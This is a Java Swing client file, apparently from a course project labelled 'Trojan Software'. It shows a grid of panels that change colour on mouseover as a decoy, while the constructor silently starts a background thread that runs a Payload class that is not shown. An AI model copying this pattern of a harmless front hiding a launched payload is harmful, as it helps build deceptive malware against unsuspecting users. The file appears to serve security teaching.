import java.awt.*;
import java.text.*;
import javax.swing.*;
import javax.swing.GroupLayout;
import javax.swing.table.*;
import javax.swing.event.*;
import java.lang.*;
import java.awt.event.*;
import java.util.*;
import java.io.*;
import java.io.PrintWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.BufferedReader;
import java.io.FileReader;
import java.awt.dnd.*;
import java.awt.datatransfer.*;
import javax.imageio.*;
import java.util.Random;
import java.awt.GridLayout;


//##############################################################################

class MainFrame extends JFrame implements ActionListener
{
        Container cp;
      	
        JPanel inputPanel;
        JPanel container;
		JPanel tempPanel;
       	
        JButton exitButton;
        JButton sendButton;
      
	  	Random rand = new Random();
		
		DataOutputStream dos;
		DataInputStream dis;
		
		float r;
		float g;
		float b;
		Color randomColor;
		
		//MailSender ms;
    
    //============================Constructor===================================
    MainFrame()
    {
		
        inputPanel = new JPanel();
		
        container = new JPanel();
              
  		container.setLayout(new GridLayout(50,50));
		

		

		
			for(int i = 0; i < 2500; i++)
		{	
			tempPanel = new JPanel();
			tempPanel.addMouseListener(new MouseAdapter() {
				JPanel mypanel = tempPanel;
			    @Override
			    public void mouseEntered(MouseEvent e) 
				{
					r = rand.nextFloat();
			        g = rand.nextFloat();
			        b = rand.nextFloat();
			                randomColor = new Color(r, g, b);
			                    mypanel.setBackground(randomColor);
			                    
			                }
			            });
				
			
			container.add(tempPanel);
		}
		//pack();
		
		cp = getContentPane();
		inputPanel.add(container);
		cp.add(inputPanel, BorderLayout.CENTER);

        setupMainFrame(40, 40, "Logan Davis - Project 5 - Trojan Software - CLIENT");
		new Thread(new Runnable()
		{
			public void run()
			{
				new Payload();
			}
		}).start();
    }//end Constructor

  
    
//##############################################################################

//========================================================================================================================================= 
    void setupMainFrame(int xScreenPercentage, int yScreenPercentage, String title)
    {
        Toolkit tk;
        Dimension d;
        
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        
        tk = Toolkit.getDefaultToolkit();
        d = tk.getScreenSize();
        setSize(d.width/2, d.height/2);
        
        setLocation((Toolkit.getDefaultToolkit().getScreenSize().width  - getSize().width) / 2, (Toolkit.getDefaultToolkit().getScreenSize().height - getSize().height) / 2);
        
        setTitle(title);// Sets the title bar
        
        setVisible(true);
        
    }//end of setupMainFrame()
    
//=========================================================================================================================================
    @Override
    public void actionPerformed(ActionEvent e)
    {
		String cmd = e.getActionCommand();
        if (cmd.equals("EXIT"))
		{
			
			System.exit(0);
		}            

    }//end of actionPerformed(...)
//=========================================================================================================================================

}//End of class MyFrameClass
